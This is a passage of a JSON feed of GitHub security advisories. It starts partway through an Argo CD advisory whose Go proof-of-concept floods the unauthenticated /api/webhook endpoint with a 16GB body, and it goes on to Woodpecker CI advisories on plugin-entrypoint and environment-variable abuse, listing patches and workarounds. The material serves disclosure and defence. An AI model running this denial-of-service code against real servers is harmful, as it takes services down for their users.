true\n    }\n\n    for i := n; i &lt; len(p); i++ {\n        if r.read+int64(i)-int64(n)+1 == r.size-1 {\n            // End of JSON\n            p[i] = '\"'\n            p[i+1] = '}'\n            r.read += int64(i) + 2 - int64(n)\n            return i + 2 - n, nil\n        } else {\n            p[i] = 'x' // Dummy data\n        }\n    }\n\n    r.read += int64(len(p)) - int64(n)\n    if start {\n        return len(p), nil\n    }\n    return len(p) - n, nil\n}\n\nfunc main() {\n    // Initialize the custom reader with the desired size (16GB in this case).\n    payloadSize := int64(16) * 1024 * 1024 * 1024 // 16GB\n    reader := &amp;DummyJSONReader{size: payloadSize}\n\n    // HTTP client setup\n    httpClient := &amp;http.Client{\n        Timeout: 0, // No timeout\n        Transport: &amp;http.Transport{\n            TLSClientConfig: &amp;tls.Config{InsecureSkipVerify: true},\n        },\n    }\n\n    req, err := http.NewRequest(\"POST\", \"https://localhost:8080/api/webhook\", reader)\n    if err != nil {\n        panic(err)\n    }\n\n    // Set headers\n    req.Header.Set(\"Content-Type\", \"application/json\")\n    req.Header.Set(\"X-GitHub-Event\", \"push\")\n\n    resp, err := httpClient.Do(req)\n    if err != nil {\n        panic(err)\n    }\n    defer resp.Body.Close()\n\n    println(\"Response status code:\", resp.StatusCode)\n}\n</code></pre>\n<h3 id=\"patches\">Patches</h3>\n<p>A patch for this vulnerability has been released in the following Argo CD versions:</p>\n<p>v2.11.6\nv2.10.15\nv2.9.20</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<p>Open an issue in <a href=\"https://github.com/argoproj/argo-cd/issues\">the Argo CD issue tracker</a> or <a href=\"https://github.com/argoproj/argo-cd/discussions\">discussions</a>\nJoin us on <a href=\"https://argoproj.github.io/community/join-slack\">Slack</a> in channel #argo-cd</p>\n<h3 id=\"credits\">Credits</h3>\n<p>This vulnerability was found &amp; reported by Jakub Ciolek</p>\n<p>The Argo team would like to thank these contributors for their responsible disclosure and constructive communications during the resolve of this issue</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/argoproj/argo-cd/security/advisories/GHSA-jmvp-698c-4x3w\">https://github.com/argoproj/argo-cd/security/advisories/GHSA-jmvp-698c-4x3w</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/46c0c0b64deaab1ece70cb701030b76668ad0cdc\">https://github.com/argoproj/argo-cd/commit/46c0c0b64deaab1ece70cb701030b76668ad0cdc</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/540e3a57b90eb3655db54793332fac86bcc38b36\">https://github.com/argoproj/argo-cd/commit/540e3a57b90eb3655db54793332fac86bcc38b36</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/d881ee78949e23160a0b280bb159e4d3d625a4df\">https://github.com/argoproj/argo-cd/commit/d881ee78949e23160a0b280bb159e4d3d625a4df</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-40634\">https://nvd.nist.gov/vuln/detail/CVE-2024-40634</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jmvp-698c-4x3w\">https://github.com/advisories/GHSA-jmvp-698c-4x3w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jmvp-698c-4x3w",
            "title": "[github.com/argoproj/argo-cd] Argo CD Unauthenticated Denial of Service (DoS) Vulnerability via /api/webhook Endpoint",
            "date_modified": "2024-07-22T19:58:30.000Z",
            "date_published": "2024-07-22T17:20:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jmvp-698c-4x3w"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The server allow to create any user who can trigger a pipeline run malicious workflows:</p>\n<ul>\n<li>Those workflows can either lead to a host takeover that runs the agent executing the workflow.</li>\n<li>Or allow to extract the secrets who would be normally provided to the plugins who's entrypoint are overwritten.</li>\n</ul>\n<h3 id=\"patches\">Patches</h3>\n<p><a href=\"https://github.com/woodpecker-ci/woodpecker/pull/3933\">https://github.com/woodpecker-ci/woodpecker/pull/3933</a></p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em>\n<strong>Enable the \"gated\" repo feature and review each change upfront</strong></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker/pull/3933\">https://github.com/woodpecker-ci/woodpecker/pull/3933</a></li>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker-security/pull/11\">https://github.com/woodpecker-ci/woodpecker-security/pull/11</a></li>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker-security/issues/8\">https://github.com/woodpecker-ci/woodpecker-security/issues/8</a> (info will be published later at <a href=\"https://github.com/woodpecker-ci/woodpecker/issues/3924\">https://github.com/woodpecker-ci/woodpecker/issues/3924</a>)</li>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker-security/issues/9\">https://github.com/woodpecker-ci/woodpecker-security/issues/9</a> (info will be published later at <a href=\"https://github.com/woodpecker-ci/woodpecker/issues/3924\">https://github.com/woodpecker-ci/woodpecker/issues/3924</a>)</li>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker/issues/3924\">https://github.com/woodpecker-ci/woodpecker/issues/3924</a> (info will be published later once we got adoption of the update)</li>\n</ul>\n<h3 id=\"credits\">Credits</h3>\n<ul>\n<li>Daniel Kilimnik <a href=\"https://x.com/D_K_Dev\">@D_K_Dev</a> (Neodyme AG)</li>\n<li>Felipe Custodio Romero <a href=\"https://x.com/_localo_\">@<em>localo</em></a> (Neodyme AG)</li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker/security/advisories/GHSA-xw35-rrcp-g7xm\">https://github.com/woodpecker-ci/woodpecker/security/advisories/GHSA-xw35-rrcp-g7xm</a></li>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker/issues/3924\">https://github.com/woodpecker-ci/woodpecker/issues/3924</a></li>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker/pull/3933\">https://github.com/woodpecker-ci/woodpecker/pull/3933</a></li>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker/commit/764329ed1dbc47c4a517ccc749e3feb34059fac8\">https://github.com/woodpecker-ci/woodpecker/commit/764329ed1dbc47c4a517ccc749e3feb34059fac8</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-41121\">https://nvd.nist.gov/vuln/detail/CVE-2024-41121</a></li>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker-security/issues/8\">https://github.com/woodpecker-ci/woodpecker-security/issues/8</a></li>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker-security/issues/9\">https://github.com/woodpecker-ci/woodpecker-security/issues/9</a></li>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker-security/pull/11\">https://github.com/woodpecker-ci/woodpecker-security/pull/11</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xw35-rrcp-g7xm\">https://github.com/advisories/GHSA-xw35-rrcp-g7xm</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-xw35-rrcp-g7xm",
            "title": "[go.woodpecker-ci.org/woodpecker] Woodpecker's custom workspace allow to overwrite plugin entrypoint executable",
            "date_modified": "2024-07-22T13:18:37.000Z",
            "date_published": "2024-07-19T19:59:08.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-xw35-rrcp-g7xm"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The server allow to create any user who can trigger a pipeline run malicious workflows:</p>\n<ul>\n<li>Those workflows can either lead to a host takeover that runs the agent executing the workflow.</li>\n<li>Or allow to extract the secrets who would be normally provided to the plugins who's entrypoint are overwritten.</li>\n</ul>\n<h3 id=\"patches\">Patches</h3>\n<p><a href=\"https://github.com/woodpecker-ci/woodpecker/pull/3933\">https://github.com/woodpecker-ci/woodpecker/pull/3933</a></p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em>\n<strong>Enable the \"gated\" repo feature and review each change upfront</strong></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker/pull/3933\">https://github.com/woodpecker-ci/woodpecker/pull/3933</a></li>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker-security/pull/11\">https://github.com/woodpecker-ci/woodpecker-security/pull/11</a></li>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker-security/issues/8\">https://github.com/woodpecker-ci/woodpecker-security/issues/8</a> (info will be published later at <a href=\"https://github.com/woodpecker-ci/woodpecker/issues/3924\">https://github.com/woodpecker-ci/woodpecker/issues/3924</a>)</li>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker-security/issues/9\">https://github.com/woodpecker-ci/woodpecker-security/issues/9</a> (info will be published later at <a href=\"https://github.com/woodpecker-ci/woodpecker/issues/3924\">https://github.com/woodpecker-ci/woodpecker/issues/3924</a>)</li>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker/issues/3924\">https://github.com/woodpecker-ci/woodpecker/issues/3924</a> (info will be published later once we got adoption of the update)</li>\n</ul>\n<h3 id=\"credits\">Credits</h3>\n<ul>\n<li>Daniel Kilimnik <a href=\"https://x.com/D_K_Dev\">@D_K_Dev</a> (Neodyme AG)</li>\n<li>Felipe Custodio Romero <a href=\"https://x.com/_localo_\">@<em>localo</em></a> (Neodyme AG)</li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker/security/advisories/GHSA-xw35-rrcp-g7xm\">https://github.com/woodpecker-ci/woodpecker/security/advisories/GHSA-xw35-rrcp-g7xm</a></li>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker/issues/3924\">https://github.com/woodpecker-ci/woodpecker/issues/3924</a></li>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker/pull/3933\">https://github.com/woodpecker-ci/woodpecker/pull/3933</a></li>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker/commit/764329ed1dbc47c4a517ccc749e3feb34059fac8\">https://github.com/woodpecker-ci/woodpecker/commit/764329ed1dbc47c4a517ccc749e3feb34059fac8</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-41121\">https://nvd.nist.gov/vuln/detail/CVE-2024-41121</a></li>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker-security/issues/8\">https://github.com/woodpecker-ci/woodpecker-security/issues/8</a></li>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker-security/issues/9\">https://github.com/woodpecker-ci/woodpecker-security/issues/9</a></li>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker-security/pull/11\">https://github.com/woodpecker-ci/woodpecker-security/pull/11</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xw35-rrcp-g7xm\">https://github.com/advisories/GHSA-xw35-rrcp-g7xm</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-xw35-rrcp-g7xm",
            "title": "[go.woodpecker-ci.org/woodpecker/v2] Woodpecker's custom workspace allow to overwrite plugin entrypoint executable",
            "date_modified": "2024-07-22T13:18:37.000Z",
            "date_published": "2024-07-19T19:59:08.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-xw35-rrcp-g7xm"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The server allow to create any user who can trigger a pipeline run malicious workflows:</p>\n<ul>\n<li>Those workflows can either lead to a host takeover that runs the agent executing the workflow.</li>\n<li>Or allow to extract the secrets who would be normally provided to the plugins who's entrypoint are overwritten.</li>\n</ul>\n<h3 id=\"patches\">Patches</h3>\n<p><a href=\"https://github.com/woodpecker-ci/woodpecker/pull/3909\">https://github.com/woodpecker-ci/woodpecker/pull/3909</a>\n<a href=\"https://github.com/woodpecker-ci/woodpecker/pull/3934\">https://github.com/woodpecker-ci/woodpecker/pull/3934</a></p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em>\n<strong>Enable the \"gated\" repo feature and review each change upfront of running</strong></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker/pull/3909\">https://github.com/woodpecker-ci/woodpecker/pull/3909</a></li>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker/pull/3934\">https://github.com/woodpecker-ci/woodpecker/pull/3934</a></li>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker-security/issues/10\">https://github.com/woodpecker-ci/woodpecker-security/issues/10</a> (info will be published later at <a href=\"https://github.com/woodpecker-ci/woodpecker/issues/3929\">https://github.com/woodpecker-ci/woodpecker/issues/3929</a>)</li>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker/issues/3929\">https://github.com/woodpecker-ci/woodpecker/issues/3929</a> (info will be published later once we got adoption of the update)</li>\n</ul>\n<h3 id=\"credits\">Credits</h3>\n<ul>\n<li>Daniel Kilimnik <a href=\"https://x.com/D_K_Dev\">@D_K_Dev</a> (Neodyme AG)</li>\n<li>Felipe Custodio Romero <a href=\"https://x.com/_localo_\">@<em>localo</em></a> (Neodyme AG)</li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker/security/advisories/GHSA-3wf2-2pq4-4rvc\">https://github.com/woodpecker-ci/woodpecker/security/advisories/GHSA-3wf2-2pq4-4rvc</a></li>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker/issues/3929\">https://github.com/woodpecker-ci/woodpecker/issues/3929</a></li>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker/pull/3909\">https://github.com/woodpecker-ci/woodpecker/pull/3909</a></li>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker/pull/3934\">https://github.com/woodpecker-ci/woodpecker/pull/3934</a></li>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker/commit/8aa3e5ec82c92eca3279e4be68625111eeedf1c4\">https://github.com/woodpecker-ci/woodpecker/commit/8aa3e5ec82c92eca3279e4be68625111eeedf1c4</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-41122\">https://nvd.nist.gov/vuln/detail/CVE-2024-41122</a></li>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker-security/issues/10\">https://github.com/woodpecker-ci/woodpecker-security/issues/10</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3wf2-2pq4-4rvc\">https://github.com/advisories/GHSA-3wf2-2pq4-4rvc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3wf2-2pq4-4rvc",
            "title": "[go.woodpecker-ci.org/woodpecker] Woodpecker's custom environment variables allow to alter execution flow of plugins",
            "date_modified": "2024-07-22T13:17:48.000Z",
            "date_published": "2024-07-19T19:59:06.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3wf2-2pq4-4rvc"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}